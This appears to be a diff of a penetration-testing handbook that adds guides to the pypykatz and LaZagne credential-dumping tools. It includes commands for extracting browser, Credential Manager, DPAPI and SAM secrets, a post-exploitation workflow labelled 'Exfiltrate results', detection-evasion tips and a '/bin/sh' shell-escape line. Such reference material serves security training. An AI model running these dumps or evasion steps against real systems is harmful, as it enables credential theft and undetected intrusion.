+<h3 id="registry-dump-output"><a class="header" href="#registry-dump-output">Registry Dump Output</a></h3>
+<pre><code>============== SAM ==============
+HBoot Key: a1b2c3d4...
+SAM Key: e5f6g7h8...
+
+== User: Administrator ==
+RID: 500
+NTLM: aad3b435b51404eeaad3b435b51404ee
+</code></pre>
+<hr>
+<h2 id="comparison-with-mimikatz"><a class="header" href="#comparison-with-mimikatz">Comparison with Mimikatz</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Feature</th><th>pypykatz</th><th>Mimikatz</th></tr>
+</thead>
+<tbody>
+<tr><td>Platform</td><td>Cross-platform</td><td>Windows only</td></tr>
+<tr><td>Live LSASS</td><td>Windows only</td><td>Windows</td></tr>
+<tr><td>Offline LSASS</td><td>Any OS</td><td>Windows</td></tr>
+<tr><td>Detection</td><td>Lower (Python)</td><td>Higher (well-known)</td></tr>
+<tr><td>Dependencies</td><td>Python 3</td><td>None (standalone)</td></tr>
+<tr><td>Kerberos attacks</td><td>Limited</td><td>Full support</td></tr>
+<tr><td>Token manipulation</td><td>No</td><td>Yes</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="useful-options-2"><a class="header" href="#useful-options-2">Useful Options</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Option</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>-o &lt;format&gt;</code></td><td>Output format (json, grep, text)</td></tr>
+<tr><td><code>-r</code></td><td>Recursive directory parsing</td></tr>
+<tr><td><code>-k</code></td><td>Kerberos ticket extraction</td></tr>
+<tr><td><code>--pvk</code></td><td>Domain backup key for masterkey decryption</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="related-tools-3"><a class="header" href="#related-tools-3">Related Tools</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Tool</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td>Mimikatz</td><td>Original Windows credential extraction</td></tr>
+<tr><td>LaZagne</td><td>Multi-platform credential recovery</td></tr>
+<tr><td>SharpDPAPI</td><td>C# DPAPI attacks</td></tr>
+<tr><td>DonPAPI</td><td>Remote DPAPI extraction</td></tr>
+<tr><td>Impacket</td><td>Python toolkit with secretsdump.py</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="core-takeaways-5"><a class="header" href="#core-takeaways-5">Core Takeaways</a></h2>
+<ul>
+<li>Use pypykatz for offline analysis of LSASS dumps on non-Windows systems</li>
+<li>Supports same DPAPI attacks as Mimikatz for Credential Manager extraction</li>
+<li>Lower detection rate compared to native Mimikatz binary</li>
+<li>Registry parsing provides SAM, LSA secrets, and cached credentials</li>
+<li>JSON output enables easy parsing and automation</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="lazagne"><a class="header" href="#lazagne">LaZagne</a></h1>
+<p>LaZagne is an open-source application used to retrieve passwords stored on a local computer. It supports multiple platforms (Windows, Linux, macOS) and can extract credentials from a wide variety of software including browsers, email clients, databases, sysadmin tools, and Windows Credential Manager.</p>
+<h2 id="key-capabilities-1"><a class="header" href="#key-capabilities-1">Key Capabilities</a></h2>
+<ul>
+<li><strong>Multi-Platform</strong>: Works on Windows, Linux, and macOS</li>
+<li><strong>Browser Credentials</strong>: Chrome, Firefox, Edge, Opera, IE, and more</li>
+<li><strong>Windows Credentials</strong>: Credential Manager, DPAPI-protected secrets</li>
+<li><strong>Application Passwords</strong>: Email clients, databases, FTP clients, WiFi, etc.</li>
+<li><strong>Memory Extraction</strong>: Some modules extract from process memory</li>
+</ul>
+<hr>
+<h2 id="installation-7"><a class="header" href="#installation-7">Installation</a></h2>
+<h3 id="windows"><a class="header" href="#windows">Windows</a></h3>
+<pre><code class="language-powershell"># Download standalone executable
+https://github.com/AlessandroZ/LaZagne/releases
+
+# Or run from Python
+git clone https://github.com/AlessandroZ/LaZagne.git
+cd LaZagne
+pip install -r requirements.txt
+python laZagne.py all
+</code></pre>
+<h3 id="linuxmacos"><a class="header" href="#linuxmacos">Linux/macOS</a></h3>
+<pre><code class="language-bash">git clone https://github.com/AlessandroZ/LaZagne.git
+cd LaZagne
+pip3 install -r requirements.txt
+python3 laZagne.py all
+</code></pre>
+<hr>
+<h2 id="basic-usage-3"><a class="header" href="#basic-usage-3">Basic Usage</a></h2>
+<h3 id="extract-all-credentials"><a class="header" href="#extract-all-credentials">Extract All Credentials</a></h3>
+<pre><code class="language-bash"># Windows
+laZagne.exe all
+
+# Linux/macOS
+python3 laZagne.py all
+</code></pre>
+<h3 id="quiet-mode-passwords-only"><a class="header" href="#quiet-mode-passwords-only">Quiet Mode (Passwords Only)</a></h3>
+<pre><code class="language-bash">laZagne.exe all -quiet
+</code></pre>
+<h3 id="write-output-to-file"><a class="header" href="#write-output-to-file">Write Output to File</a></h3>
+<pre><code class="language-bash">laZagne.exe all -oN          # Normal text output
+laZagne.exe all -oJ          # JSON output
+laZagne.exe all -oA          # All formats
+</code></pre>
+<hr>
+<h2 id="modules-2"><a class="header" href="#modules-2">Modules</a></h2>
+<h3 id="list-available-modules"><a class="header" href="#list-available-modules">List Available Modules</a></h3>
+<pre><code class="language-bash">laZagne.exe -h
+</code></pre>
+<h3 id="module-categories-1"><a class="header" href="#module-categories-1">Module Categories</a></h3>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Category</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>browsers</code></td><td>Web browser credentials</td></tr>
+<tr><td><code>chats</code></td><td>Messaging applications</td></tr>
+<tr><td><code>databases</code></td><td>Database clients</td></tr>
+<tr><td><code>games</code></td><td>Gaming platforms</td></tr>
+<tr><td><code>git</code></td><td>Git credentials</td></tr>
+<tr><td><code>mails</code></td><td>Email clients</td></tr>
+<tr><td><code>memory</code></td><td>Process memory extraction</td></tr>
+<tr><td><code>multimedia</code></td><td>Media applications</td></tr>
+<tr><td><code>php</code></td><td>PHP-related tools</td></tr>
+<tr><td><code>svn</code></td><td>SVN clients</td></tr>
+<tr><td><code>sysadmin</code></td><td>System administration tools</td></tr>
+<tr><td><code>wifi</code></td><td>WiFi passwords</td></tr>
+<tr><td><code>windows</code></td><td>Windows Credential Manager, DPAPI</td></tr>
+</tbody>
+</table>
+</div>
+<h3 id="run-specific-module-category"><a class="header" href="#run-specific-module-category">Run Specific Module Category</a></h3>
+<pre><code class="language-bash">laZagne.exe browsers
+laZagne.exe windows
+laZagne.exe sysadmin
+laZagne.exe wifi
+</code></pre>
+<hr>
+<h2 id="windows-credential-manager-extraction"><a class="header" href="#windows-credential-manager-extraction">Windows Credential Manager Extraction</a></h2>
+<h3 id="extract-credential-manager-secrets"><a class="header" href="#extract-credential-manager-secrets">Extract Credential Manager Secrets</a></h3>
+<pre><code class="language-bash">laZagne.exe windows
+</code></pre>
+<h3 id="windows-module-components"><a class="header" href="#windows-module-components">Windows Module Components</a></h3>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Module</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>credman</code></td><td>Windows Credential Manager</td></tr>
+<tr><td><code>vault</code></td><td>Windows Vault</td></tr>
+<tr><td><code>dpapi</code></td><td>DPAPI-protected secrets</td></tr>
+<tr><td><code>autologon</code></td><td>Auto-logon credentials</td></tr>
+<tr><td><code>cachedump</code></td><td>Cached domain credentials</td></tr>
+<tr><td><code>hashdump</code></td><td>Local SAM hashes (requires SYSTEM)</td></tr>
+<tr><td><code>lsa_secrets</code></td><td>LSA secrets (requires SYSTEM)</td></tr>
+</tbody>
+</table>
+</div>
+<h3 id="run-specific-windows-module"><a class="header" href="#run-specific-windows-module">Run Specific Windows Module</a></h3>
+<pre><code class="language-bash">laZagne.exe windows -m credman
+laZagne.exe windows -m vault
+laZagne.exe windows -m dpapi
+</code></pre>
+<hr>
+<h2 id="browser-credential-extraction"><a class="header" href="#browser-credential-extraction">Browser Credential Extraction</a></h2>
+<h3 id="all-browsers-1"><a class="header" href="#all-browsers-1">All Browsers</a></h3>
+<pre><code class="language-bash">laZagne.exe browsers
+</code></pre>
+<h3 id="supported-browsers"><a class="header" href="#supported-browsers">Supported Browsers</a></h3>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Browser</th><th>Module</th></tr>
+</thead>
+<tbody>
+<tr><td>Chrome</td><td><code>chrome</code></td></tr>
+<tr><td>Firefox</td><td><code>firefox</code></td></tr>
+<tr><td>Edge (Chromium)</td><td><code>chromiumedge</code></td></tr>
+<tr><td>Opera</td><td><code>opera</code></td></tr>
+<tr><td>Internet Explorer</td><td><code>ie</code></td></tr>
+<tr><td>Brave</td><td><code>brave</code></td></tr>
+<tr><td>Vivaldi</td><td><code>vivaldi</code></td></tr>
+</tbody>
+</table>
+</div>
+<h3 id="run-specific-browser-module"><a class="header" href="#run-specific-browser-module">Run Specific Browser Module</a></h3>
+<pre><code class="language-bash">laZagne.exe browsers -m chrome
+laZagne.exe browsers -m firefox
+</code></pre>
+<hr>
+<h2 id="advanced-options-2"><a class="header" href="#advanced-options-2">Advanced Options</a></h2>
+<h3 id="use-specific-user-profile"><a class="header" href="#use-specific-user-profile">Use Specific User Profile</a></h3>
+<pre><code class="language-bash">laZagne.exe all -user &lt;username&gt;
+</code></pre>
+<h3 id="specify-password-for-dpapi-decryption"><a class="header" href="#specify-password-for-dpapi-decryption">Specify Password for DPAPI Decryption</a></h3>
+<pre><code class="language-bash">laZagne.exe all -password &lt;user_password&gt;
+</code></pre>
+<h3 id="extract-from-offline-hives"><a class="header" href="#extract-from-offline-hives">Extract from Offline Hives</a></h3>
+<pre><code class="language-bash"># Requires SAM, SECURITY, SYSTEM hives
+laZagne.exe all -local -sam SAM -security SECURITY -system SYSTEM
+</code></pre>
+<h3 id="verbose-output-4"><a class="header" href="#verbose-output-4">Verbose Output</a></h3>
+<pre><code class="language-bash">laZagne.exe all -v
+laZagne.exe all -vv   # Extra verbose
+</code></pre>
+<hr>
+<h2 id="output-formats-2"><a class="header" href="#output-formats-2">Output Formats</a></h2>
+<h3 id="normal-text-output"><a class="header" href="#normal-text-output">Normal Text Output</a></h3>
+<pre><code class="language-bash">laZagne.exe all -oN
+# Creates: results/credentials.txt
+</code></pre>
+<h3 id="json-output-1"><a class="header" href="#json-output-1">JSON Output</a></h3>
+<pre><code class="language-bash">laZagne.exe all -oJ
+# Creates: results/credentials.json
+</code></pre>
+<h3 id="all-formats"><a class="header" href="#all-formats">All Formats</a></h3>
+<pre><code class="language-bash">laZagne.exe all -oA
+# Creates both text and JSON files
+</code></pre>
+<h3 id="specify-output-directory"><a class="header" href="#specify-output-directory">Specify Output Directory</a></h3>
+<pre><code class="language-bash">laZagne.exe all -oN -output /path/to/output/
+</code></pre>
+<hr>
+<h2 id="example-output"><a class="header" href="#example-output">Example Output</a></h2>
+<h3 id="credential-manager-output"><a class="header" href="#credential-manager-output">Credential Manager Output</a></h3>
+<pre><code>|====================================================================|
+|                                                                    |
+|                        The LaZagne Project                         |
+|                                                                    |
+|                          ! MUSIC AGAIN !                           |
+|                                                                    |
+|====================================================================|
+
+------------------- Credman passwords -----------------
+
+[+] Password found !!!
+URL: Domain:interactive=SRV01\mcharles
+Login: SRV01\mcharles
+Password: P@ssw0rd123!
+
+[+] Password found !!!
+URL: https://github.com
+Login: admin@company.com
+Password: github_token_123
+
+[+] 2 passwords have been found.
+</code></pre>
+<hr>
+<h2 id="linux-specific-modules"><a class="header" href="#linux-specific-modules">Linux-Specific Modules</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Module</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>env</code></td><td>Environment variables</td></tr>
+<tr><td><code>memory</code></td><td>Process memory</td></tr>
+<tr><td><code>mimipy</code></td><td>Similar to Mimikatz</td></tr>
+<tr><td><code>docker</code></td><td>Docker credentials</td></tr>
+<tr><td><code>aws</code></td><td>AWS credentials</td></tr>
+<tr><td><code>gcloud</code></td><td>Google Cloud credentials</td></tr>
+</tbody>
+</table>
+</div>
+<h3 id="run-linux-specific"><a class="header" href="#run-linux-specific">Run Linux-Specific</a></h3>
+<pre><code class="language-bash">python3 laZagne.py all
+python3 laZagne.py sysadmin
+python3 laZagne.py memory
+</code></pre>
+<hr>
+<h2 id="common-workflows-2"><a class="header" href="#common-workflows-2">Common Workflows</a></h2>
+<h3 id="workflow-1-quick-credential-dump"><a class="header" href="#workflow-1-quick-credential-dump">Workflow 1: Quick Credential Dump</a></h3>
+<pre><code class="language-bash"># Dump all credentials quietly
+laZagne.exe all -quiet
+
+# Save to JSON for parsing
+laZagne.exe all -oJ -quiet
+</code></pre>
+<h3 id="workflow-2-targeted-windows-credential-manager"><a class="header" href="#workflow-2-targeted-windows-credential-manager">Workflow 2: Targeted Windows Credential Manager</a></h3>
+<pre><code class="language-bash"># Extract Credential Manager and Vault
+laZagne.exe windows -m credman
+laZagne.exe windows -m vault
+
+# With user password for DPAPI
+laZagne.exe windows -password 'UserPassword123'
+</code></pre>
+<h3 id="workflow-3-post-exploitation-script"><a class="header" href="#workflow-3-post-exploitation-script">Workflow 3: Post-Exploitation Script</a></h3>
+<pre><code class="language-bash"># On Windows target
+laZagne.exe all -oJ -output C:\Temp\ -quiet
+
+# Exfiltrate results
+type C:\Temp\credentials.json
+</code></pre>
+<hr>
+<h2 id="comparison-with-other-tools"><a class="header" href="#comparison-with-other-tools">Comparison with Other Tools</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Feature</th><th>LaZagne</th><th>Mimikatz</th><th>pypykatz</th></tr>
+</thead>
+<tbody>
+<tr><td>Platform</td><td>Multi-platform</td><td>Windows</td><td>Multi-platform</td></tr>
+<tr><td>Browser creds</td><td>Yes</td><td>No</td><td>No</td></tr>
+<tr><td>Credential Manager</td><td>Yes</td><td>Yes</td><td>Yes</td></tr>
+<tr><td>LSASS extraction</td><td>Limited</td><td>Full</td><td>Full</td></tr>
+<tr><td>Application creds</td><td>Extensive</td><td>Limited</td><td>No</td></tr>
+<tr><td>Kerberos attacks</td><td>No</td><td>Yes</td><td>Limited</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="evasion-and-detection"><a class="header" href="#evasion-and-detection">Evasion and Detection</a></h2>
+<h3 id="detection-points"><a class="header" href="#detection-points">Detection Points</a></h3>
+<ul>
+<li>Process creation of LaZagne binary</li>
+<li>Access to browser profile directories</li>
+<li>DPAPI calls</li>
+<li>Access to Credential Manager stores</li>
+</ul>
+<h3 id="evasion-tips"><a class="header" href="#evasion-tips">Evasion Tips</a></h3>
+<ul>
+<li>Compile from source with modifications</li>
+<li>Use Python script instead of binary</li>
+<li>Run individual modules to reduce footprint</li>
+<li>Use <code>-quiet</code> flag to minimize console output</li>
+</ul>
+<hr>
+<h2 id="related-tools-4"><a class="header" href="#related-tools-4">Related Tools</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Tool</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td>Mimikatz</td><td>Windows credential extraction from memory</td></tr>
+<tr><td>pypykatz</td><td>Python Mimikatz implementation</td></tr>
+<tr><td>SharpDPAPI</td><td>C# DPAPI attacks</td></tr>
+<tr><td>CredNinja</td><td>Credential testing tool</td></tr>
+<tr><td>BrowserGather</td><td>Browser credential extraction</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="core-takeaways-6"><a class="header" href="#core-takeaways-6">Core Takeaways</a></h2>
+<ul>
+<li>LaZagne extracts credentials from many sources Mimikatz doesn’t cover (browsers, applications)</li>
+<li>Works cross-platform (Windows, Linux, macOS)</li>
+<li>Use <code>-quiet</code> and <code>-oJ</code> for clean, parseable output</li>
+<li>Windows module specifically targets Credential Manager and DPAPI</li>
+<li>Lower detection rate for application credentials vs LSASS-based tools</li>
+<li>Combine with Mimikatz/pypykatz for comprehensive credential extraction</li>
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="troubleshooting-1"><a class="header" href="#troubleshooting-1">Troubleshooting</a></h1>
@@ -27060,7 +27964,7 @@ ac
 <h1 id="infosec"><a class="header" href="#infosec">InfoSec</a></h1>
 <h2 id="directory-map-33"><a class="header" href="#directory-map-33">Directory Map</a></h2>
 <ul>
-<li><a href="#enumeration">enumeration</a></li>
+<li><a href="#enumeration-1">enumeration</a></li>
 <li><a href="#crawling">crawling</a></li>
 <li><a href="#robots-text">robots-text</a></li>
 <li><a href="#shell-harnesses">shell-harnesses</a></li>
@@ -27244,7 +28148,7 @@ find . -exec /bin/sh \; -quit
 <h2 id="reconnaissance-strategy"><a class="header" href="#reconnaissance-strategy">Reconnaissance Strategy</a></h2>
 <p>Exploring the IANA Registry and experimenting with the various <code>.well-known</code> URIs is an invaluable approach to uncovering additional web reconnaissance opportunities. As demonstrated with the <code>openid-configuration</code> endpoint above, these standardized URIs provide structured access to critical metadata and configuration details, enabling security professionals to comprehensively map out a website’s security landscape.</p>
 <div style="break-before: page; page-break-before: always;"></div>
-<h1 id="enumeration"><a class="header" href="#enumeration">Enumeration</a></h1>
+<h1 id="enumeration-1"><a class="header" href="#enumeration-1">Enumeration</a></h1>
 <h2 id="principles-of-enumeration"><a class="header" href="#principles-of-enumeration">Principles of Enumeration</a></h2>
 <ul>
 <li>Enumeration is the systematic process of gathering information about a target system or network to identify potential vulnerabilities and entry points. There are two methods of enumeration: active and passive.</li>
